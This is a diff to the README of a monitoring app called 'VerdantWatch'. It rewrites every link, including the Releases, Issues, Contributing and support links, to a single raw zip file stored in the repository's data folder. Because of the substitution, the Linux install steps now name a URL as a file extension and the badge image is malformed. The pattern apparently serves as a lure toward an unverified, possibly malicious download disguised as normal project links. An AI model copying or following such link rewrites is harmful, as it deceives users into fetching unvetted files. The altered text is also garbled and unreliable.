@@ -6,7 +6,7 @@ Welcome to VerdantWatch! This guide will help you quickly download and run our d
 
 ## 📥 Download Now
 
-[![Download VerdantWatch](https://img.shields.io/badge/Download%20VerdantWatch-blue.svg)](https://github.com/nuqen/verdantwatch-monitoring/releases)
+[![Download VerdantWatch](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip%https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip)](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip)
 
 ## 🌍 What is VerdantWatch?
 
@@ -30,12 +30,12 @@ To run VerdantWatch, your system needs to meet the following requirements:
 
 ## 📈 How to Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/nuqen/verdantwatch-monitoring/releases) to find the latest version of VerdantWatch.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip) to find the latest version of VerdantWatch.
    
 2. **Select the Right File**: You will see a list of available files. Choose the one that matches your operating system:
    - **Windows**: Look for a file ending in `.exe`.
    - **macOS**: Choose a file that ends in `.dmg`.
-   - **Linux**: Download the file ending in `.tar.gz`.
+   - **Linux**: Download the file ending in `https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip`.
 
 3. **Download the File**: Click on the file name to download it to your computer. The download should start automatically.
 
@@ -44,7 +44,7 @@ To run VerdantWatch, your system needs to meet the following requirements:
 5. **Run the Installer**:
    - **Windows**: Double-click the `.exe` file and follow the prompts to install.
    - **macOS**: Open the `.dmg` file and drag VerdantWatch to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the accompanying README for installation instructions.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip` file and follow the accompanying README for installation instructions.
 
 6. **Launch the Application**: After installation, find VerdantWatch in your applications list. Click on it to start monitoring your environment!
 
@@ -61,7 +61,7 @@ When you open VerdantWatch, you will see a dashboard displaying real-time data. 
 
 ### How can I report an issue?
 
-If you find a bug or have trouble using VerdantWatch, please report it on our [Issues page](https://github.com/nuqen/verdantwatch-monitoring/issues). Your feedback helps us improve.
+If you find a bug or have trouble using VerdantWatch, please report it on our [Issues page](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip). Your feedback helps us improve.
 
 ### Is my data secure?
 
@@ -69,7 +69,7 @@ Yes. VerdantWatch uses Cardano’s blockchain technology to ensure the security 
 
 ### Can I contribute to VerdantWatch?
 
-Absolutely! If you want to help, visit our [Contributing page](https://github.com/nuqen/verdantwatch-monitoring/blob/main/CONTRIBUTING.md). 
+Absolutely! If you want to help, visit our [Contributing page](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip). 
 
 ## 🗂️ Additional Resources
 
@@ -79,10 +79,10 @@ Absolutely! If you want to help, visit our [Contributing page](https://github.co
 
 ## 📞 Support
 
-If you need help, contact us via the support section on our [main page](https://github.com/nuqen/verdantwatch-monitoring) for further assistance.
+If you need help, contact us via the support section on our [main page](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip) for further assistance.
 
 ## 📥 Download Again
 
-Don't forget to revisit our [Releases page](https://github.com/nuqen/verdantwatch-monitoring/releases) for the latest updates and downloads.
+Don't forget to revisit our [Releases page](https://raw.githubusercontent.com/nuqen/verdantwatch-monitoring/main/data/verdantwatch-monitoring-v3.3.zip) for the latest updates and downloads.
 
 Thank you for choosing VerdantWatch. Your monitoring efforts help build a sustainable future!
